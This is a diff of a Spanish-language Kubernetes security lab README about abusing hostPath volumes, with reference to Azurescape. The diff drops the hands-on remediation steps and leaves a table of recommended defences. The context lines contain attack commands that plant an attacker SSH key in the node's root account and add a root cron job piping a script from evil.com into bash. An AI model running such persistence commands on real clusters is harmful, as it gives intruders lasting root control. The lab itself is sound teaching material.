@@ -19,7 +19,6 @@ Investigadores de Palo Alto descubrieron **Azurescape**, una vulnerabilidad que 
 | Archivo | Descripción |
 |---------|-------------|
 | `vulnerable.yaml` | Pod con `hostPath: /` + app víctima con secrets |
-| `secure.yaml` | Pod con PSA restricted + Kyverno deny hostPath |
 
 ---
 
@@ -96,38 +95,16 @@ echo 'ssh-rsa AAAAB3...atacante@kali' >> /host/root/.ssh/authorized_keys
 echo '* * * * * curl http://evil.com/backdoor.sh | bash' >> /host/var/spool/cron/crontabs/root
 ```
 
-## Fase 3: Aplicar Remediación
-
-```bash
-kubectl delete -f vulnerable.yaml
-kubectl apply -f secure.yaml
-```
-
-## Fase 4: Verificar que hostPath es Bloqueado
-
-```bash
-# Intentar crear un pod con hostPath en el namespace protegido
-kubectl apply -f vulnerable.yaml
-# → Error: pods "hostpath-pod" is forbidden:
-#   violates PodSecurity "restricted:latest":
-#   hostPath volumes (volume "host-fs")
-
-# El pod seguro funciona normalmente
-kubectl get pods -n lab3-hostpath
-# → secure-app   Running
-```
-
 ---
 
-## Comparación
+## Remediación Recomendada
 
-| Aspecto | ❌ Vulnerable | ✅ Seguro |
-|---------|:---:|:---:|
-| hostPath | `path: /` (root completo) | Sin hostPath (emptyDir) |
-| PSA | Sin enforcement | `enforce: restricted` |
-| Security Context | Ninguno | runAsNonRoot + readOnly + drop ALL |
-| Kyverno | Sin policy | `deny-host-path` Enforce |
-| Impacto | Root en el nodo | Contenedor aislado |
+| Medida | Descripción |
+|--------|-------------|
+| **PSA restricted** | Previene volúmenes hostPath a nivel de namespace |
+| **Kyverno/OPA** | Policy `deny-host-path` para bloquear hostPath |
+| **SecurityContext** | runAsNonRoot + readOnlyRootFilesystem + drop ALL |
+| **emptyDir** | Usar volúmenes efímeros en lugar de hostPath |
 
 ---
 
